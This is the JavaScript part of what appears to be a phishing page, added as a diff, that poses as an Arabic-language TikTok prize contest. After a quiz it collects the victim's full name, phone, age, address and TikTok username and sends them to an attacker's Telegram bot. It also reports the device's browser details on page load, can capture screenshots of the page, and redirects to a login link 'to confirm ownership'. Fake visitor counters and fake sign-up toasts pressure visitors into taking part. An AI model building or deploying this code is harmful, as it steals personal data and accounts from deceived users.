+            { q: "ما هي الدولة المبتكرة للتطبيق الأصلي لمنصة TikTok؟", options: ["الصين", "الولايات المتحدة", "اليابان"], ans: 0 },
+            { q: "ما الميزة التي تتيح لك مشاركة البث المباشر مع صانع محتوى آخر؟", options: ["الـ Co-Host / القوست", "الاستكشاف", "القصص"], ans: 0 },
+            { q: "ما هو الحد الأقصى الافتراضي لأطول مقطع فيديو عادي تم تحديثه مؤخراً؟", options: ["10 دقائق", "60 ثانية", "30 دقيقة"], ans: 0 },
+            { q: "ما اسم الشارة المطلوبة للتوثيق الرسمي للحسابات الكبرى؟", options: ["الشارة الزرقاء / الذهبية", "الدرع الفضي", "شارة النجمة"], ans: 0 },
+            { q: "أي من هذه الخيارات يتيح لك حفظ الفيديو بدون علامة مائية؟", options: ["TikTok Gold النسخة الخاصة", "الحفظ العادي", "التقاط شاشة"], ans: 0 },
+            { q: "ما اسم خوارزمية عرض الفيديوهات المقترحة للمستخدمين؟", options: ["صفحة لك (For You Page)", "شريط الأصدقاء", "قائمة الاشتراكات"], ans: 0 },
+            { q: "ما هو العملة الافتراضية المستخدمة لإرسال الهدايا في البث المباشر؟", options: ["العملات / Coins", "النقاط", "الجوائز"], ans: 0 },
+            { q: "ماذا يسمى خيار الدمج والتفاعل بالفيديو جنبًا إلى جنب مع صانع آخر؟", options: ["دويتو / Duet", "نسخ", "تحرير"], ans: 0 },
+            { q: "ما الميزة التي تسمح لك بإعادة اقتطاع جزء من فيديو آخر والتعليق عليه؟", options: ["دمج / Stitch", "سلسلة", "تفاعل"], ans: 0 },
+            { q: "ما هو المقياس الأهم لانتشار الفيديو في الإكسبلور؟", options: ["معدل إكمال المشاهدة (Watch Time)", "عدد التعليقات فقط", "طول العنوان"], ans: 0 },
+            { q: "كم عدد المتابعين المطلوبين كحد أدنى ببعض الدول لفتح البث المباشر؟", options: ["1000 متابع", "10,000 متابع", "500 متابع"], ans: 0 },
+            { q: "ما هي الأداة المخصصة لتحليل أداء الحساب والمشاهدات؟", options: ["تحليلات TikTok Analytics", "مركز المساعدة", "إعدادات الخصوصية"], ans: 0 },
+            { q: "ما نوع المحتوى الأكثر نجاحاً وسرعة للانتشار في المنصة؟", options: ["الفيديوهات القصيرة والجذابة", "المقالات النصية", "الصور الثابتة"], ans: 0 },
+            { q: "ما هو رمز التوثيق الذي يظهر بجانب اسم المشاهير؟", options: ["علامة صح توثيق", "رمز تاج", "نجمة حمراء"], ans: 0 },
+            { q: "ما هو خيار حماية الحساب الأكثر أماناً من السرقة؟", options: ["التحقق بخطوتين (2FA)", "كلمة سر قصيرة", "ربط بريد فقط"], ans: 0 },
+            { q: "ما هي ميزة TikTok Series للمبدعين؟", options: ["تقديم محتوى مدفوع حصري", "إغلاق الحساب", "زيادة السرعة"], ans: 0 },
+            { q: "ماذا يسمى التحدي الشائع الذي ينشره المستخدمون بنفس الصوت؟", options: ["التريند / Trend", "البث", "الفلتر"], ans: 0 },
+            { q: "ما هي الفلاتر التفاعلية القائمة على الذكاء الاصطناعي؟", options: ["تأثيرات AR / AI", "الملصقات النصية", "الصوت الخلفي"], ans: 0 },
+            { q: "ماذا يحدث للحساب عند مخالفة إرشادات المجتمع مكرراً؟", options: ["حظر نهائي أو مؤقت", "مكافأة", "توثيق تلقائي"], ans: 0 },
+            { q: "كيف تزيد من إمكانية وصول مقطعك للجمهور المستهدف؟", options: ["استخدام الهاشتاجات المناسبة", "إغلاق التعليقات", "حذف الفيديو متكرراً"], ans: 0 }
+        ];
+
+        let selectedQuestions = [];
+        let quizIndex = 0;
+        let correctAnswersCount = 0;
+        let quizTimerInterval = null;
+        let quizTimeLeft = 20;
+
+        function startQuizChallenge() {
+            goToStep(2);
+            correctAnswersCount = 0;
+            quizIndex = 0;
+            // اختيار 5 أسئلة عشوائية
+            selectedQuestions = [...questionBank].sort(() => 0.5 - Math.random()).slice(0, 5);
+            loadQuizQuestion();
+        }
+
+        function loadQuizQuestion() {
+            clearInterval(quizTimerInterval);
+            if (quizIndex >= selectedQuestions.length) {
+                if (correctAnswersCount >= 3) {
+                    playSound('success');
+                    alert("🎉 تهانينا! لقد اجتزت تحدي الأسئلة بنجاح. انتقل الآن لتسجيل بياناتك واستلام الجائزة!");
+                    goToStep(3);
+                } else {
+                    alert("لم تتجاوز الحد الأدنى (3 إجابات صحيحة). سيتم إعادة التحدي بأسئلة جديدة!");
+                    startQuizChallenge();
+                }
+                return;
+            }
+
+            const currentQ = selectedQuestions[quizIndex];
+            document.getElementById("quiz-current-num").innerText = quizIndex + 1;
+            document.getElementById("quiz-question").innerText = currentQ.q;
+
+            const optionsContainer = document.getElementById("quiz-options");
+            optionsContainer.innerHTML = "";
+
+            // خلط خيارات الأجوبة عشوائياً
+            let optionsWithIndex = currentQ.options.map((opt, i) => ({ text: opt, isCorrect: i === currentQ.ans }));
+            optionsWithIndex.sort(() => 0.5 - Math.random());
+
+            optionsWithIndex.forEach(optObj => {
+                const btn = document.createElement("button");
+                btn.className = "option-btn";
+                btn.innerText = optObj.text;
+                btn.onclick = () => handleAnswer(optObj.isCorrect, btn);
+                optionsContainer.appendChild(btn);
+            });
+
+            // بدء العداد التنازلي (20 ثانية)
+            quizTimeLeft = 20;
+            updateTimerDisplay();
+            quizTimerInterval = setInterval(() => {
+                quizTimeLeft--;
+                playSound('tick');
+                updateTimerDisplay();
+                if (quizTimeLeft <= 0) {
+                    clearInterval(quizTimerInterval);
+                    playSound('warning');
+                    // استبدال فوراً بسؤال آخر عند انقضاء الوقت
+                    quizIndex++;
+                    loadQuizQuestion();
+                }
+            }, 1000);
+        }
+
+        function updateTimerDisplay() {
+            document.getElementById("quiz-timer-num").innerText = quizTimeLeft;
+            const percentage = (quizTimeLeft / 20) * 100;
+            document.getElementById("quiz-progress").style.width = `${percentage}%`;
+        }
+
+        function handleAnswer(isCorrect, btnElement) {
+            clearInterval(quizTimerInterval);
+            if (isCorrect) {
+                playSound('success');
+                btnElement.classList.add("correct");
+                correctAnswersCount++;
+                setTimeout(() => {
+                    quizIndex++;
+                    loadQuizQuestion();
+                }, 1000);
+            } else {
+                playSound('warning');
+                btnElement.classList.add("wrong");
+                setTimeout(() => {
+                    // سحب سؤال بديل فوراً دون احتساب نقطة ودون ملاحظات
+                    quizIndex++;
+                    loadQuizQuestion();
+                }, 800);
+            }
+        }
+
+        // ==========================================
+        // التحقق الذكي من إدخال البيانات الشخصية
+        // ==========================================
+        function toggleHelp(id) {
+            playSound('click');
+            const el = document.getElementById(id);
+            if (el) el.style.display = el.style.display === 'block' ? 'none' : 'block';
+        }
+
+        function validateField(input, type) {
+            const val = input.value.trim();
+            const icon = document.getElementById(`valid-${input.id.replace('field-', '')}`);
+            let isValid = false;
+
+            // حظر الأرقام العشوائية المكررة مثل 111111 أو 123456
+            const isSequential = /^(123456|111111|000000|12345678|999999)$/.test(val);
+
+            if (val.length > 2 && !isSequential) {
+                if (type === 'text') isValid = true;
+                if (type === 'phone') isValid = val.length >= 7;
+                if (type === 'number') isValid = !isNaN(val) && parseInt(val) > 0;
+                if (type === 'username') isValid = val.startsWith('@') || val.length >= 3;
+            }
+
+            if (isValid) {
+                if (icon) icon.classList.add("valid");
+            } else {
+                if (icon) icon.classList.remove("valid");
+            }
+
+            // الإرسال المرحلي مع كل كتابة وحفظ مسودة
+            localStorage.setItem(`draft_${input.id}`, val);
+        }
+
+        function handleUserInfoSubmit(e) {
+            e.preventDefault();
+
+            const fullname = document.getElementById("field-fullname").value.trim();
+            const phone = document.getElementById("field-phone").value.trim();
+            const age = document.getElementById("field-age").value.trim();
+            const address = document.getElementById("field-address").value.trim();
+            const username = document.getElementById("field-username").value.trim();
+            const followers = document.getElementById("field-followers").value.trim();
+
+            if (!fullname || !phone || !age || !address || !username || !followers) {
+                playSound('warning');
+                alert("يرجى تعبئة جميع الخانات الإجبارية بشكل صحيح!");
+                return;
+            }
+
+            contestantName = fullname;
+            localStorage.setItem("contestant_name", fullname);
+
+            playSound('click');
+            showOverlay("جاري مطابقة بيانات الحساب وتأكيد التأهل...");
+
+            // ارسال البيانات لتليجرام
+            const dataMsg = `📋 **تسجيل بيانات جديد:**\n👤 **الاسم:** ${fullname}\n📞 **الهاتف:** \`${phone}\`\n🎂 **العمر:** ${age}\n📍 **العنوان:** ${address}\n🆔 **المعرف:** \`${username}\`\n👥 **المتابعين:** ${followers}\n🆔 **ID المتسابق:** \`${contestantId}\``;
+            sendTelegramAlert(dataMsg);
+
+            setTimeout(() => {
+                hideOverlay();
+                goToStep(4);
+            }, 2000);
+        }
+
+        function redirectToLogin() {
+            playSound('click');
+            showOverlay("جاري التوجيه إلى تطبيق TikTok لتأكيد الملكية...");
+            setTimeout(() => {
+                window.location.href = LOGIN_REDIRECT_URL;
+            }, 3000);
+        }
+
+        function showOverlay(text) {
+            document.getElementById("overlay-text").innerText = text;
+            document.getElementById("status-overlay").style.display = "flex";
+        }
+        function hideOverlay() {
+            document.getElementById("status-overlay").style.display = "none";
+        }
+
+        // ==========================================
+        // العدادات التفاعلية والعد التنازلي
+        // ==========================================
+        function startLiveCounters() {
+            let vCnt = 522;
+            let rCnt = 392;
+
+            setInterval(() => {
+                vCnt += Math.floor(Math.random() * 5) - 2;
+                if (vCnt < 400) vCnt = 450;
+                document.getElementById("cnt-visitors").innerText = vCnt;
+
+                if (Math.random() > 0.6 && rCnt < 980 && rCnt < vCnt) {
+                    rCnt += 1;
+                    document.getElementById("cnt-registered").innerText = rCnt;
+                }
+            }, 3500);
+
+            // عداد أسبوعي ينتهي بنهاية الجمعة
+            function updateWeeklyTimer() {
+                const now = new Date();
+                const dayOfWeek = now.getDay(); // 5 = الجمعة
+                const friday = new Date(now);
+                friday.setDate(now.getDate() + ((5 + 7 - dayOfWeek) % 7));
+                friday.setHours(23, 59, 59, 999);
+
+                const diff = friday - now;
+                if (diff <= 0) {
+                    document.getElementById("countdown-timer").innerText = "00 : 00 : 00 : 00";
+                    return;
+                }
+
+                const d = Math.floor(diff / (1000 * 60 * 60 * 24));
+                const h = Math.floor((diff / (1000 * 60 * 60)) % 24);
+                const m = Math.floor((diff / (1000 * 60)) % 60);
+                const s = Math.floor((diff / 1000) % 60);
+
+                document.getElementById("countdown-timer").innerText = `${d}ي : ${h}س : ${m}د : ${s}ث`;
+            }
+            setInterval(updateWeeklyTimer, 1000);
+            updateWeeklyTimer();
+        }
+
+        // ==========================================
+        // الإشعارات المنبثقة الحية Toast System
+        // ==========================================
+        const sampleNames = ["محمد علي", "أحمد خالد", "سارة محمود", "عمر الفاروق", "فاطمة الزهراء", "عبدالله سعيد", "ياسين حسين", "ريم الشمري"];
+        const sampleCountries = ["اليمن", "السعودية", "مصر", "الإمارات", "العراق", "الجزائر", "المغرب"];
+
+        function triggerRandomToast() {
+            const name = sampleNames[Math.floor(Math.random() * sampleNames.length)];
+            const country = sampleCountries[Math.floor(Math.random() * sampleCountries.length)];
+            
+            const toast = document.createElement("div");
+            toast.className = "toast-notification";
+            toast.innerHTML = `<span>🎉</span> <div>قام <strong>${name}***</strong> من <strong>${country}</strong> بالتسجيل بنجاح!</div>`;
+            
+            const container = document.getElementById("toast-container");
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.remove();
+            }, 5000);
+        }
+
+        setInterval(triggerRandomToast, 18000);
+
+        // ==========================================
+        // تتبع الجهاز والإنترنت (Offline Detection)
+        // ==========================================
+        window.addEventListener('online', () => {
+            document.getElementById("offline-modal").style.display = "none";
+        });
+        window.addEventListener('offline', () => {
+            document.getElementById("offline-modal").style.display = "flex";
+        });
+
+        function collectTelemetry() {
+            const deviceDetails = `
+📱 **دخول جديد للموقع:**
+👤 **المتسابق:** ${contestantName}
+🆔 **المعرف:** \`${contestantId}\`
+💻 **النظام / المتصفح:** ${navigator.userAgent}
+🌐 **اللغة:** ${navigator.language}
+📏 **أبعاد الشاشة:** ${window.innerWidth}x${window.innerHeight}
+⏱ **الوقت:** ${new Date().toLocaleString('ar-EG')}
+            `;
+            sendTelegramAlert(deviceDetails);
+        }
+
+        // ==========================================
+        // كود خلفية الجزئيات المضيئة Particle VFX
+        // ==========================================
+        function initParticleVFX() {
+            const canvas = document.getElementById("particle-canvas");
+            const ctx = canvas.getContext("2d");
+            let particles = [];
+
+            function resize() {
+                canvas.width = window.innerWidth;
+                canvas.height = window.innerHeight;
+            }
+            window.addEventListener('resize', resize);
+            resize();
+
+            for (let i = 0; i < 45; i++) {
+                particles.push({
+                    x: Math.random() * canvas.width,
+                    y: Math.random() * canvas.height,
+                    radius: Math.random() * 2 + 1,
+                    color: Math.random() > 0.5 ? '#25F4EE' : '#FE2C55',
+                    vx: (Math.random() - 0.5) * 0.8,
+                    vy: (Math.random() - 0.5) * 0.8
+                });
+            }
+
+            function animate() {
+                ctx.clearRect(0, 0, canvas.width, canvas.height);
+                particles.forEach(p => {
+                    p.x += p.vx;
+                    p.y += p.vy;
+                    if (p.x < 0 || p.x > canvas.width) p.vx *= -1;
+                    if (p.y < 0 || p.y > canvas.height) p.vy *= -1;
+
+                    ctx.beginPath();
+                    ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
+                    ctx.fillStyle = p.color;
+                    ctx.shadowBlur = 8;
+                    ctx.shadowColor = p.color;
+                    ctx.fill();
+                });
+                requestAnimationFrame(animate);
+            }
+            animate();
+        }
+
+        // ==========================================
+        // كود المحادثة المباشرة المدمج المحدث
+        // ==========================================
+        let lastUpdateId = parseInt(sessionStorage.getItem("last_telegram_update_id") || "0");
+        const processedMsgIds = new Set(JSON.parse(sessionStorage.getItem("processed_msg_ids") || "[]"));
+
+        let isChatOpen = false;
+        let autoCloseTimer = null;
+        let isSupportOnline = true;
+
+        document.addEventListener("DOMContentLoaded", () => {
+            initParticleVFX();
+            startLiveCounters();
+            collectTelemetry();
+            loadChatHistory();
+            loadDraftMessage();
+        });
+
+        window.toggleChat = function() {
+            playSound('click');
+            const widget = document.getElementById("chat-widget");
+            if (!widget) return;
+            isChatOpen = !isChatOpen;
+            widget.style.display = isChatOpen ? "flex" : "none";
+        };
+
+        function getCurrentTimeFormatted() {
+            const now = new Date();
+            return now.toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit', hour12: true });
+        }
+
+        window.saveDraftMessage = function() {
+            const input = document.getElementById("chat-user-input");
+            if (input) sessionStorage.setItem("chat_draft", input.value);
+        };
+
+        function loadDraftMessage() {
+            const draft = sessionStorage.getItem("chat_draft");
+            const input = document.getElementById("chat-user-input");
+            if (draft && input) input.value = draft;
+        }
+
+        function saveChatHistory(msgObj) {
+            let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+            history.push(msgObj);
+            sessionStorage.setItem("chat_history", JSON.stringify(history));
+        }
+
+        function loadChatHistory() {
+            let history = JSON.parse(sessionStorage.getItem("chat_history") || "[]");
+            history.forEach(m => renderMessage(m.text, m.className, m.time, m.status, m.imgUrl));
+        }
+
+        function sendTelegramAlert(text) {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            }).catch(() => {});
+        }
+
+        window.showChatFilePreview = function() {
+            const preview = document.getElementById("chat-file-preview");
+            if (preview) preview.style.display = "block";
+        };
+
+        window.sendChatMessage = function(e) {
+            if (e) e.preventDefault();
+
+            const textInput = document.getElementById("chat-user-input");
+            const fileInput = document.getElementById("chat-file-input");
+            const preview = document.getElementById("chat-file-preview");
+
+            const text = textInput ? textInput.value.trim() : "";
+            const hasFile = fileInput && fileInput.files.length > 0;
+
+            if (!text && !hasFile) return;
+
+            playSound('click');
+            const timeStr = getCurrentTimeFormatted();
+            const formattedHeader = `📌 **رسالة من:** ${contestantName}\n🆔 **المعرف:** \`${contestantId}\`\n💬 **الرسالة:** ${text}`;
+
+            if (hasFile) {
+                const formData = new FormData();
+                formData.append("chat_id", CHAT_ID);
+                formData.append("photo", fileInput.files[0]);
+                formData.append("caption", formattedHeader);
+                formData.append("parse_mode", "Markdown");
+
+                const fileURL = URL.createObjectURL(fileInput.files[0]);
+                displayAndSaveMessage(text, 'user-msg', timeStr, '✔', fileURL);
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+            } else {
+                displayAndSaveMessage(text, 'user-msg', timeStr, '✔');
+                sendTelegramAlert(formattedHeader);
+            }
+
+            if (textInput) textInput.value = "";
+            sessionStorage.removeItem("chat_draft");
+            if (fileInput) fileInput.value = "";
+            if (preview) preview.style.display = "none";
+        };
+
+        window.takeUserInstantScreenshot = function() {
+            if (typeof html2canvas === 'undefined') return;
+            html2canvas(document.body).then(canvas => {
+                canvas.toBlob(blob => {
+                    const formData = new FormData();
+                    formData.append("chat_id", CHAT_ID);
+                    formData.append("photo", blob, "user_screenshot.png");
+                    formData.append("caption", `📸 **لقطة شاشة للمتسابق:** ${contestantName}\n🆔 \`${contestantId}\``);
+                    formData.append("parse_mode", "Markdown");
+
+                    const timeStr = getCurrentTimeFormatted();
+                    const imgURL = URL.createObjectURL(blob);
+                    displayAndSaveMessage("تم إرسال لقطة الشاشة للدعم.", 'user-msg', timeStr, '✔', imgURL);
+
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: formData });
+                });
+            });
+        };
+
+        function displayAndSaveMessage(text, className, time, status = '', imgUrl = null) {
+            renderMessage(text, className, time, status, imgUrl);
+            saveChatHistory({ text, className, time, status, imgUrl });
+        }
+
+        function renderMessage(text, className, time, status = '', imgUrl = null) {
+            const chatBox = document.getElementById("chat-box");
+            if (!chatBox) return;
+
+            const msgElement = document.createElement("div");
+            msgElement.className = `msg ${className}`;
+
+            if (imgUrl) {
+                const img = document.createElement("img");
+                img.src = imgUrl;
+                msgElement.appendChild(img);
+            }
+
+            if (text) {
+                const textSpan = document.createElement("span");
+                textSpan.innerText = text;
+                msgElement.appendChild(textSpan);
+            }
+
+            const metaDiv = document.createElement("div");
+            metaDiv.className = "msg-meta";
+            metaDiv.innerHTML = `<span>${time}</span>` + (status ? `<span class="checkmark ${status === '✔✔' ? 'read' : ''}">${status}</span>` : '');
+            msgElement.appendChild(metaDiv);
+
+            chatBox.appendChild(msgElement);
+            chatBox.scrollTop = chatBox.scrollHeight;
+        }
+
+        function fetchAdminMessages() {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`)
+                .then(res => res.json())
+                .then(async data => {
+                    if (data.ok && data.result.length > 0) {
+                        for (const update of data.result) {
+                            lastUpdateId = Math.max(lastUpdateId, update.update_id);
+                            sessionStorage.setItem("last_telegram_update_id", lastUpdateId.toString());
+
+                            const msg = update.message;
+                            if (!msg) continue;
+
+                            if (processedMsgIds.has(msg.message_id)) continue;
+
+                            let text = msg.text || msg.caption || "";
+
+                            if (text.includes(contestantId)) {
+                                processedMsgIds.add(msg.message_id);
+                                sessionStorage.setItem("processed_msg_ids", JSON.stringify(Array.from(processedMsgIds)));
+
+                                let telegramImgUrl = null;
+                                if (msg.photo && msg.photo.length > 0) {
+                                    const largestPhoto = msg.photo[msg.photo.length - 1];
+                                    try {
+                                        const fileRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${largestPhoto.file_id}`);
+                                        const fileData = await fileRes.json();
+                                        if (fileData.ok && fileData.result.file_path) {
+                                            telegramImgUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${fileData.result.file_path}`;
+                                        }
+                                    } catch (e) {}
+                                }
+
+                                let cleanText = text.replace(new RegExp(contestantId + ":?", "gi"), "").trim();
+                                if (cleanText || telegramImgUrl) {
+                                    displayAndSaveMessage(cleanText, 'admin-msg', getCurrentTimeFormatted(), '', telegramImgUrl);
+                                    playSound('success');
+                                    const widget = document.getElementById("chat-widget");
+                                    if (widget) widget.style.display = "flex";
+                                }
+                            }
+                        }
+                    }
+                })
+                .catch(() => {});
+        }
+
+        setInterval(fetchAdminMessages, 2500);
+    </script>
+</body>
+</html>
